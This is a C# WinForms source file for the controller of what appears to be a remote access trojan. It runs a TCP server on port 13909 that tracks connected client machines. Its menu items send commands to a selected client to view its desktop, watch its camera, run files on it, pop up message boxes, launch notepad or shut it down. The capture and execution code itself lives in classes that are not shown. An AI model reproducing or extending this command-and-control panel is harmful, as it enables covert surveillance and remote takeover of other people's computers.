using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Banana.Klaslar;
using WatsonTcp;

namespace Banana
{
    public partial class Form1 : Form
    {
        List<string> iplist = new List<string>();
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            clientdatagrid.ContextMenuStrip = sagtikmenu;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Server.server = new WatsonTcpServer(textBox2.Text, 13909);
            textBox1.AppendText("Dinleniyor...\r\n");
            button1.Enabled = false;
            textBox2.ReadOnly = true;
            Server.server.Events.ClientConnected += ClientConnected;
            Server.server.Events.ClientDisconnected += ClientDisconnected;
            Server.server.Events.MessageReceived += MessageReceived;
            Server.server.Start();
        }

        public void ClientConnected(object sender, ConnectionEventArgs args)
        {
            textBox1.AppendText("Bağlandı: " + args.IpPort + "\r\n");
            iplist.Add(args.IpPort);
        }

        public  void ClientDisconnected(object sender, DisconnectionEventArgs args)
        {
            DataGridViewRow row = (DataGridViewRow)clientdatagrid.Rows[0].Clone();
            clientdatagrid.Rows.Add(row);
            textBox1.AppendText("Bağlantı Kesildi: " + args.IpPort + ": " + args.Reason.ToString() + "\r\n");
            iplist.Remove(args.IpPort);
            clientdatagrid.Rows.RemoveAt(clientdatagrid.CurrentRow.Index);
        }

        public void MessageReceived(object sender, MessageReceivedEventArgs args)
        {
            string mesaj = Encoding.UTF8.GetString(args.Data);
            textBox1.AppendText("Mesaj Geldi => " + args.IpPort + " => " + mesaj + "\r\n");

            if (mesaj.Split(':')[0] == "ekle")
            {
                DataGridViewRow row = (DataGridViewRow)clientdatagrid.Rows[0].Clone();
                row.Cells[0].Value = mesaj.Split(':')[1];
                row.Cells[1].Value = args.IpPort;
                row.Cells[2].Value = mesaj.Split(':')[2];
                clientdatagrid.Rows.Add(row);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void mesajGönderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MesajJUAN mj = new MesajJUAN(clientdatagrid.CurrentRow.Cells[1].Value.ToString());
            mj.Show();
        }

        private void kapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Server.server.Send(clientdatagrid.CurrentRow.Cells[1].Value.ToString(), "kapat");
        }

        private void messageBoxGönderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MesajBox mb = new MesajBox(clientdatagrid.CurrentRow.Cells[1].Value.ToString());
            mb.Show();
        }

        private void masaüstüGörüntülemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MasaustuGoruntuleme mg = new MasaustuGoruntuleme(clientdatagrid.CurrentRow.Cells[1].Value.ToString());
            mg.Show();
        }

        private void bağlantıyıKesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Server.server.Send(clientdatagrid.CurrentRow.Cells[1].Value.ToString(), "baglantiyikes");
        }

        private void kameraİzlemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KameraIzleme ki = new KameraIzleme(clientdatagrid.CurrentRow.Cells[1].Value.ToString());
            ki.Show();
        }

        private void dosyaÇalıştırToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DosyaCalistir dc = new DosyaCalistir(clientdatagrid.CurrentRow.Cells[1].Value.ToString());
            dc.Show();
        }

        private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Server.server.Send(clientdatagrid.CurrentRow.Cells[1].Value.ToString(), "baslat:notepad");
        }
    }
}
